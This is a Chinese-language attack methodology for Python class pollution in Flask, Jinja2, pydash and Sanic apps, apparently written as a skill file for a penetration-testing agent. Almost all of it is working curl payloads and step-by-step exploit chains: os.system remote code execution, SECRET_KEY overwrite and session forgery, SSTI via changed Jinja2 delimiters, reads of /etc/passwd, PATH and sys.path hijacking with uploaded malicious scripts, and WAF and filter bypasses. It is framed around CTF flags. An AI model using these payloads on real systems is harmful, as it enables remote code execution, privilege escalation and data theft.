# python-prototype-pollution

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# Python 原型链污染方法论

Python 原型链污染（又称 Class Pollution / Attribute Injection）利用 Python 类继承和 `__globals__` 机制，通过递归合并函数或深度属性设置函数（如 `pydash.set_()`），从一个普通对象"跳出"当前作用域，修改全局变量、Flask 配置、Jinja2 引擎设置，实现 RCE、文件读取或权限提升。

## 深入参考

- Flask/Jinja2 完整污染目标清单 → [references/flask-jinja2-targets.md](references/flask-jinja2-targets.md)
- Phase 3A-3I 详细利用 Payload 与 Phase 4 高级链 → [references/exploitation-payloads.md](references/exploitation-payloads.md)
- pydash 路径过滤绕过 + Cookie 八进制绕过 → [references/pydash-bypass.md](references/pydash-bypass.md)
- Sanic 框架污染链 → [references/sanic-pollution-chain.md](references/sanic-pollution-chain.md)
- 完整污染链速查清单 → [references/quick-reference.md](references/quick-reference.md)

---

## Phase 0: 识别污染入口

寻找将用户 JSON 输入递归合并/设置到 Python 对象的代码模式：

| 入口类型 | 代码特征 | 常见接口 |
|---------|---------|---------|
| 自定义 merge 函数 | `def merge(src, dst)` + `setattr(dst, k, v)` | POST JSON 配置更新 |
| pydash.set_() | `pydash.set_(obj, path, value)` | API 属性设置 |
| pydash.get() | `pydash.get(obj, path)` | API 属性查询 |
| pydash.invoke() | `pydash.invoke(obj, path, arg)` | API 方法调用 |
| 其他深度设置库 | `glom`, `box`, 任何 deep-set 实现 | 配置更新接口 |

**识别信号**：
- 接口接受嵌套 JSON 对象（`{"a": {"b": {"c": "value"}}}` 格式）
- 接口接受点分路径字符串（`"a.b.c"` 格式）
- 响应头显示 Python/Flask/Werkzeug/uvicorn
- 页面/源码/requirements.txt 提及 pydash、merge、update

## Phase 1: 确认污染可行性

### 1.1 判断 obj 类型

| obj 类型 | 起步路径 | 识别方法 |
|---------|---------|---------|
| **自定义类实例** | `__init__.__globals__` | 直接设 `__init__.__globals__.xxx` 有效 |
| **字典 (dict)** | `__class__.__init__.__globals__` | 需先 `__class__` 跳出字典键值逻辑 |

### 1.2 无害探测（不破坏目标）

```bash
# merge 函数场景: 嵌套 JSON
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__class__": {"__name__": "test"}}'

# pydash.set_ 场景: 点分路径
curl -X POST http://target/api/update \
  -H 'Content-Type: application/json' \
  -d '{"path": "__class__.__name__", "value": "test"}'

# pydash.get 场景: 信息泄露探测
curl -X POST http://target/api/get \
  -H 'Content-Type: application/json' \
  -d '{"path": "__class__"}'
```

## Phase 2: 选择污染目标

### 决策树

```
确认 Python 原型链污染可行
├── 目标使用 pydash.invoke()？
│   └── 是 → 直接 RCE（Phase 3A）
├── 目标使用 Flask？
│   ├── 需要提权？ → 污染类属性 is_admin（Phase 3B）
│   ├── 有 session？ → 污染 SECRET_KEY → 伪造 session（Phase 3C）
│   ├── 有 SSTI 但被过滤？ → 污染 Jinja2 定界符（Phase 3D）
│   ├── 有 render_template？ → 污染 searchpath/静态目录（Phase 3E）
│   └── 有 before_first_request？ → 重置 _got_first_request（Phase 3F）
├── 目标有文件上传？
│   ├── 代码调用相对路径命令 → PATH 劫持（Phase 3G）
│   └── 代码有懒加载 import → sys.path 劫持（Phase 3H）
└── 有函数 shell=False 等默认参数？
    └── 污染 __defaults__ / __kwdefaults__（Phase 3I）
```

> 各 Phase 的详细利用命令和代码见 [references/exploitation-payloads.md](references/exploitation-payloads.md)

### 推荐攻击顺序

从低风险到高风险逐步升级：

1. **无害探测** → 确认污染可行（Phase 1.2）
2. **信息泄露** → 通过 get 读取 SECRET_KEY、app.config 等（Phase 3C 步骤 1）
3. **权限提升** → 污染 is_admin 或全局变量（Phase 3B）
4. **文件读取** → _static_url_path 或 searchpath（Phase 3E）
5. **RCE** → invoke / 定界符+SSTI / PATH 劫持（Phase 3A/3D/3G）

如果有 pydash 相关线索，同时通过 `search_vulndb("pydash")` 获取 CVE-2023-26145 条目中的详细利用链，两者互补。

## 与 SSTI 和反序列化的关系

| 技术 | 入口 | 关系 |
|------|------|------|
| **原型链污染** | merge/set_ 接口 | 本 skill |
| **SSTI** | 模板注入点 | 原型链污染可改 Jinja2 定界符绕过 SSTI 过滤 |
| **反序列化** | pickle/json | SECRET_KEY 被污染后可伪造 session → 触发 pickle 反序列化 |

三者可组合使用：原型链污染 → 修改 SECRET_KEY → 伪造 session → pickle RCE。


---

## REF: exploitation-payloads

# Python 原型链污染 — 利用 Payload 详解
## Phase 3A: invoke() 直接 RCE

```bash
# 利用链按可靠性排序:
# 1. random._os.system（random 几乎总被导入）
curl -X POST http://target/api/invoke \
  -H 'Content-Type: application/json' \
  -d '{"path": "__init__.__globals__.random._os.system", "arg": "cat /flag*"}'

# 2. os.system（需目标 import os）
curl -X POST http://target/api/invoke \
  -H 'Content-Type: application/json' \
  -d '{"path": "__init__.__globals__.os.system", "arg": "cat /flag*"}'

# 3. __builtins__.__import__（万能但可能被过滤）
curl -X POST http://target/api/invoke \
  -H 'Content-Type: application/json' \
  -d '{"path": "__init__.__globals__.__builtins__.__import__", "arg": "os"}'
```

## Phase 3B: 类属性污染 → 权限提升

```bash
# merge 场景: 污染 User.is_admin（影响所有实例）
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__class__": {"is_admin": true}}'

# pydash 场景:
curl -X POST http://target/api/update \
  -H 'Content-Type: application/json' \
  -d '{"path": "__class__.is_admin", "value": true}'

# 验证: 访问管理员页面
curl http://target/admin
```

## Phase 3C: Flask SECRET_KEY → Session 伪造

```bash
# 步骤 1: 污染 SECRET_KEY 为已知值
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"config": {"SECRET_KEY": "my_known_key"}}}}}'

# pydash 变体:
curl -X POST http://target/api/update \
  -H 'Content-Type: application/json' \
  -d '{"path": "__init__.__globals__.app.config.SECRET_KEY", "value": "my_known_key"}'

# 步骤 2: 用 flask-unsign 伪造 admin session
pip install flask-unsign
flask-unsign --sign --cookie '{"user": "admin", "is_admin": true}' --secret 'my_known_key'

# 步骤 3: 用伪造的 session cookie 访问
curl -b 'session=<forged_cookie>' http://target/admin
```

## Phase 3D: Jinja2 定界符污染 → 绕过 SSTI 过滤

```bash
# 当目标过滤 {{ }} 但存在 SSTI 注入点时
# 步骤 1: 把定界符从 {{ }} 改为 [[ ]]
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"jinja_env": {"variable_start_string": "[[", "variable_end_string": "]]"}}}}}'

# 步骤 2: 用新定界符执行 SSTI（不会被 {{ 过滤拦截）
curl "http://target/page?name=[[config.SECRET_KEY]]"
curl "http://target/page?name=[[request.application.__globals__.__builtins__.__import__('os').popen('id').read()]]"
```

> **模板缓存**: Jinja2 默认会缓存已编译的模板。如果目标模板页面在污染之前已被访问过，缓存中存的是旧定界符编译的结果，污染后不会自动更新。所以要在首次访问模板之前完成定界符污染。如果已被缓存，需要等应用重启或清除缓存。

## Phase 3E: 模板/静态目录污染 → 任意文件读取

```bash
# 方法 1: 修改 jinja_loader.searchpath → 读任意文件
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"jinja_loader": {"searchpath": ["/"]}}}}}'
# 然后访问触发 render_template 的页面
# render_template('flag') 会渲染 /flag

# 方法 2: 修改 _static_url_path → 静态目录变根目录
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"_static_url_path": "/"}}}}'
# 访问 http://target/static/etc/passwd 或 http://target/static/flag

# 方法 3: 修改 os.path.pardir → 绕过路径穿越检查
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"os": {"path": {"pardir": "!"}}}}}'
# os.path.pardir 默认是 ".."，改为 "!" 后 render_template 不再拦截 ..
# 然后: http://target/../../flag
```

## Phase 3F: _got_first_request → 重新触发初始化

```bash
# 当 before_first_request 中有关键逻辑（如读取 flag）但需满足条件时
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"_got_first_request": false}}}}'
# 下次请求会重新触发 @app.before_first_request 装饰的函数
```

## Phase 3G: PATH 环境变量劫持

```bash
# 前提: 目标有文件上传 + 代码用相对路径调用命令
# 步骤 1: 上传恶意脚本（假装成系统命令）
printf '#!/bin/sh\ncat /flag*' | curl -X POST http://target/upload \
  -F "file=@-;filename=git"

# 步骤 2: 污染 PATH
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"os": {"environ": {"PATH": "/tmp/uploads:/usr/bin:/bin"}}}}}'
```

## Phase 3H: sys.path 模块导入劫持

```bash
# 前提: 目标有文件上传 + 代码有懒加载 import（函数内 import）
# 步骤 1: 上传恶意 Python 模块
echo 'import os; run = lambda: os.popen("cat /flag*").read()' | \
  curl -X POST http://target/upload -F "file=@-;filename=target_module.py"

# 步骤 2: 污染 sys.path（上传目录优先）
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"sys": {"path": ["/tmp/uploads"]}}}}'
# 注意: 已缓存在 sys.modules 中的模块无法劫持
```

## Phase 3I: 函数默认参数污染

```bash
# 当代码中有 def func(arg, shell=False) 等可利用的默认参数
# __kwdefaults__ 污染（关键字参数，JSON 友好）
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"target_func": {"__kwdefaults__": {"shell": true}}}}}'

# __defaults__ 污染（位置参数，需要元组，JSON 中用数组可能可行）
# 注意: __defaults__ 要求 tuple 类型，通过 JSON 传入的 list 不一定被接受
```

## Phase 4: 高级技巧 — 获取 sys 模块的通用链

当目标代码没有 `import sys` 时，可通过 `__loader__` 或 `__spec__` 获取：

```bash
# 任何已导入的模块都有 __loader__，而 loader 定义在 importlib 中，importlib 必定导入了 sys
# 链: <任意模块>.__loader__.__init__.__globals__['sys'].modules.<目标模块>

# __spec__ 链（Python 3.4+）:
# 链: <任意模块>.__spec__.__init__.__globals__['sys'].modules.<目标模块>

# merge payload 示例: 通过 __spec__ 获取 sys.modules 再污染目标
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{
    "__init__": {
      "__globals__": {
        "__spec__": {
          "__init__": {
            "__globals__": {
              "sys": {
                "modules": {
                  "target_module": {
                    "SECRET": "polluted"
                  }
                }
              }
            }
          }
        }
      }
    }
  }'
```


---

## REF: flask-jinja2-targets

# Flask/Jinja2 污染目标详解

---

## 1. SECRET_KEY — Session 伪造

**路径**: `__init__.__globals__.app.config.SECRET_KEY`

Flask 使用 SECRET_KEY 签名 session cookie。污染为已知值后可用 `flask-unsign` 伪造任意 session。

```bash
# 污染
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"config": {"SECRET_KEY": "hacked"}}}}}'

# 伪造 session
flask-unsign --sign --cookie '{"user":"admin","is_admin":true}' --secret 'hacked'
# 输出: eyJ...

# 使用伪造 session
curl -b 'session=eyJ...' http://target/admin
```

如果 Flask 使用 pickle 反序列化 session（部分应用的自定义 session），伪造后还可触发 pickle RCE。

---

## 2. _static_url_path — 静态目录篡改实现文件读取

**路径**: `__init__.__globals__.app._static_url_path`

Flask 的 `/static/` 路由对应 `_static_url_path` 目录下的文件。默认值是 `static`。

```bash
# 污染为当前目录
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"_static_url_path": "/"}}}}'

# 读取文件
curl http://target/static/flag
curl http://target/static/etc/passwd
curl http://target/static/app/app.py
```

---

## 3. Jinja2 定界符 — 绕过 SSTI 过滤

**路径**:
- `__init__.__globals__.app.jinja_env.variable_start_string`（默认 `{{`）
- `__init__.__globals__.app.jinja_env.variable_end_string`（默认 `}}`）

当目标有 SSTI 注入点但过滤了 `{{` `}}` 时，修改定界符即可绕过。

```bash
# 同时修改起始和结束定界符
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"jinja_env": {"variable_start_string": "[[", "variable_end_string": "]]"}}}}}'

# 用新定界符注入（不被 {{ 过滤拦截）
curl "http://target/page?name=[[config]]"
curl "http://target/page?name=[[request.application.__globals__.__builtins__.__import__('os').popen('id').read()]]"
```

> ⚠️ **缓存陷阱**: 如果目标模板页面已被访问过，Jinja2 会使用缓存的编译结果。必须在首次访问模板之前完成污染。

**额外**: 还可修改 `block_start_string`（默认 `{%`）和 `block_end_string`（默认 `%}`）来绕过 `{%` 的过滤：

```bash
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"jinja_env": {"block_start_string": "<%", "block_end_string": "%>"}}}}}'
```

---

## 4. jinja_loader.searchpath — 模板加载目录篡改

**路径**: `__init__.__globals__.app.jinja_loader.searchpath`

Flask 默认从 `./templates` 目录加载模板文件。修改 searchpath 后，`render_template('flag')` 会从新路径加载。

```bash
# 修改模板搜索路径为根目录
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"jinja_loader": {"searchpath": ["/"]}}}}}'

# 如果代码调用 render_template('flag') 或 render_template(user_input)
# 则会渲染 /flag 文件内容
```

---

## 5. os.path.pardir — 绕过模板路径穿越检查

**路径**: `__init__.__globals__.os.path.pardir`

`os.path.pardir` 默认值为 `..`。Jinja2 的 `split_template_path()` 函数检查路径分段中是否包含 `os.path.pardir` 来防止目录穿越。修改这个值即可绕过。

```bash
# 将 pardir 从 ".." 改为 "!"
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"os": {"path": {"pardir": "!"}}}}}'

# 现在 render_template("../../flag") 不会被拦截
curl http://target/../../flag
```

---

## 6. _got_first_request — 重新触发 before_first_request

**路径**: `__init__.__globals__.app._got_first_request`

`@app.before_first_request` 装饰的函数只在首次请求时执行。将 `_got_first_request` 重置为 False 可强制再次执行。

```bash
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"_got_first_request": false}}}}'
# 下次请求会重新触发 before_first_request 中的初始化逻辑
```

适用场景：初始化函数中有条件性读取 flag 的逻辑，但条件依赖于之后才设置的属性值。

---

## 7. jinja_env.globals — Jinja2 全局变量注入

**路径**: `__init__.__globals__.app.jinja_env.globals`

Jinja2 的 `globals` 字典中的变量可在所有模板中直接使用。注入变量可绕过模板中的条件检查。

```bash
# 注入 permission=True 绕过 {% if permission %} 检查
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__init__": {"__globals__": {"app": {"jinja_env": {"globals": {"permission": true}}}}}}'
```

> 注意: 通过 JSON 无法直接注入 Python 函数对象（如 os.popen），只能注入基本类型值。

---

## 8. Jinja2 编译层 RCE — jinja2.runtime.exported

**路径**: 需通过 `__spec__.__init__.__globals__` 链到达 `jinja2.runtime` 模块

这是最高级的利用方式。Jinja2 编译模板时，`compiler.py` 中的 `visit_Template` 方法会将 `jinja2.runtime.exported` 列表中的名称作为模板编译的 import 语句。污染这个列表可以在模板编译时注入任意代码。

```bash
# payload 需要注入到 jinja2.runtime 模块的 exported 变量
# 通过 __spec__.__init__.__globals__['sys'].modules['jinja2.runtime'] 路径访问
# 具体 payload 格式: exported 中插入恶意 Python 表达式

# 示例（具体值取决于目标 Jinja2 版本）:
curl -X POST http://target/api/merge \
  -H 'Content-Type: application/json' \
  -d '{
    "__init__": {
      "__globals__": {
        "__spec__": {
          "__init__": {
            "__globals__": {
              "sys": {
                "modules": {
                  "jinja2.runtime": {
                    "exported": ["*;import os;os.system(\"cp /flag /app/static/f\")#"]
                  }
                }
              }
            }
          }
        }
      }
    }
  }'
# 然后访问任何触发 render_template 的页面
# 最后读取: curl http://target/static/f
```

> ⚠️ 同样受模板缓存影响，必须在目标模板首次渲染之前完成污染。

---

## 参考链接

- [Python 原型链污染变体 - 跳跳糖](https://tttang.com/archive/1876/)
- [Prototype Pollution in Python - abdulrah33m](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [idekCTF 2022 Task Manager Writeup](https://y4tacker.github.io/2023/01/16/year/2023/2023IdekCTFWriteup/#Task-Manager)
- [CVE-2023-26145 - pydash Command Injection](https://nvd.nist.gov/vuln/detail/CVE-2023-26145)


---

## REF: pydash-bypass

# pydash 路径过滤绕过
## 5.1 路径分隔符绕过

CTF 题目常对 pydash 的路径参数做过滤（如禁止 `_.`）。pydash 的路径解析器支持反斜杠转义，`\.` 被视为转义的 `.`（不分割），而 `\\.` 中 `\\` 是转义的 `\`，后面的 `.` 仍作为分割符生效。

```bash
# 题目过滤: '_.' not in key
# 绕过: 用 \\. 替代 .（反斜杠转义后 . 仍然作为路径分隔符）
# 原始路径: __class__.__init__.__globals__.app
# 绕过路径: __class__\\.__init__\\.__globals__\\.app

curl -X POST http://target/admin \
  -H 'Content-Type: application/json' \
  -d '{"key": "__class__\\\\.__init__\\\\.__globals__\\\\.app.config.SECRET_KEY", "value": "hacked"}'
# JSON 中 \\ 会被解析为单个 \，所以实际发送的是 \\.
```

> 关键理解: pydash 路径中 `\.` = 转义的点（不分割），`\\.` = 转义的反斜杠 + 分割点。当过滤器检查 `_.` 子串时，`\\.` 中间插入了 `\` 所以不匹配，但 pydash 解析时仍正常分割。

## 5.2 Cookie 八进制编码绕过

当题目在 Cookie 值中做关键字过滤（如 WAF 拦截 `__class__`、`__init__`、`__globals__` 等），可利用 Python/Flask 的 Cookie 解析对八进制转义的支持来绕过。

**原理**: HTTP Cookie 值中的 `\NNN`（三位八进制数）会被某些解析器解码为对应 ASCII 字符。例如 `_` 的 ASCII 码是 95，八进制为 `\137`。WAF 看到的是 `\137\137class\137\137`（无 `__class__` 子串），但后端解析后还原为 `__class__`。

```bash
# 原始 Cookie 值（被 WAF 拦截）:
Cookie: payload=__class__.__init__.__globals__

# 八进制编码绕过（_ = \137, . = \056）:
Cookie: payload=\137\137class\137\137\056\137\137init\137\137\056\137\137globals\137\137

# 部分编码也可（只编码被过滤的字符）:
Cookie: payload=\137\137class\137\137.__init__.__globals__
```

**组合利用**: Cookie 八进制绕过常与 pydash 路径绕过（5.1）配合使用。典型攻击链：

```bash
# 步骤 1: Cookie 八进制绕过 WAF 的关键字过滤
# 步骤 2: pydash \\. 绕过应用层的 '_.' 过滤
# 步骤 3: 到达 pydash.set_() 执行原型链污染

# 完整示例: Cookie 传递污染路径
curl http://target/admin \
  -b 'key=\137\137class\137\137\\.__init__\\.__globals__\\.app.jinja_loader.searchpath; value=/' \
  -X POST

# 然后访问模板页面读取 flag
curl http://target/page  # render_template('flag') → 读取 /flag
```

**常用八进制编码速查**:

| 字符 | ASCII | 八进制 |
|------|-------|--------|
| `_`  | 95    | `\137` |
| `.`  | 46    | `\056` |
| `/`  | 47    | `\057` |
| `\`  | 92    | `\134` |
| `'`  | 39    | `\047` |
| `"`  | 34    | `\042` |

> 注意: 八进制编码能否生效取决于 Cookie 解析层的实现。Python 的 `http.cookies.SimpleCookie` 支持八进制转义解码，Flask/Werkzeug 的 Cookie 解析在特定版本下也支持。如果八进制不生效，尝试 URL 编码（`%5F%5F` 代替 `__`）或 Unicode 编码。


---

## REF: quick-reference

# 完整污染链速查清单
```
# === 直接 RCE (invoke) ===
__init__.__globals__.random._os.system
__init__.__globals__.os.system
__init__.__globals__.__builtins__.__import__
__class__.__init__.__globals__.os.popen

# === 属性污染 (set_/merge) ===
__class__.is_admin                                    # 类属性 → 提权
__init__.__globals__.app.config.SECRET_KEY            # Flask session 伪造
__init__.__globals__.app.config.DEBUG                 # 开启调试器
__init__.__globals__.app._got_first_request           # 重触发初始化
__init__.__globals__.app._static_url_path             # 静态目录 → 文件读取
__init__.__globals__.app.jinja_env.variable_start_string  # SSTI 过滤绕过
__init__.__globals__.app.jinja_env.variable_end_string
__init__.__globals__.app.jinja_loader.searchpath       # 模板目录 → 文件读取
__init__.__globals__.os.path.pardir                   # 路径穿越检查绕过
__init__.__globals__.os.environ.PATH                  # 命令劫持
__init__.__globals__.sys.path                         # 模块导入劫持
__init__.__globals__.<func>.__defaults__              # 函数默认参数
__init__.__globals__.<func>.__kwdefaults__            # 关键字默认参数
__init__.__globals__.GLOBAL_VAR                       # 任意全局变量
__init__.__globals__.__file__                          # 劫持文件读取端点

# === Sanic 框架 ===
__init__.__globals__.app.router.name_index.__mp_main__.static.handler.keywords.directory_handler.directory_view  # 开启目录浏览
__init__.__globals__.app.router.name_index.__mp_main__.static.handler.keywords.directory_handler.directory._parts  # 修改静态目录

# === Dict obj 前缀 ===
# 所有上述链加 __class__. 前缀:
__class__.__init__.__globals__.app.config.SECRET_KEY

# === 过滤绕过速查 ===
# pydash 路径绕过: __class__\\.__init__\\.__globals__\\.target
# Cookie 八进制:   \137\137class\137\137 → __class__
# URL 编码:        %5F%5Fclass%5F%5F → __class__
```


---

## REF: sanic-pollution-chain

# Sanic 框架污染链
原型链污染不限于 Flask，Sanic 等其他 Python Web 框架同样可利用。Sanic 的路由系统中注册了静态文件处理器，可通过污染实现目录列举和任意文件读取。

## 静态路由污染

```bash
# Sanic 静态路由污染: 开启目录浏览 + 修改目录为根目录
# 1. 开启 directory_view
curl -X POST http://target/admin \
  -H 'Content-Type: application/json' \
  -d '{"key": "__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view", "value": true}'

# 2. 修改静态目录为根目录
curl -X POST http://target/admin \
  -H 'Content-Type: application/json' \
  -d '{"key": "__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts", "value": ["/"]}'

# 3. 访问 /static/ 列出根目录文件
curl http://target/static/
```

## __file__ 污染

`__file__` 污染也是通用技巧 — 当代码中有 `open(__file__).read()` 时，修改 `__file__` 可读取任意文件：

```bash
curl -X POST http://target/admin \
  -H 'Content-Type: application/json' \
  -d '{"key": "__class__\\\\.__init__\\\\.__globals__\\\\.__file__", "value": "/flag"}'
# 然后访问读取 __file__ 的端点（如 /src）
curl http://target/src
```
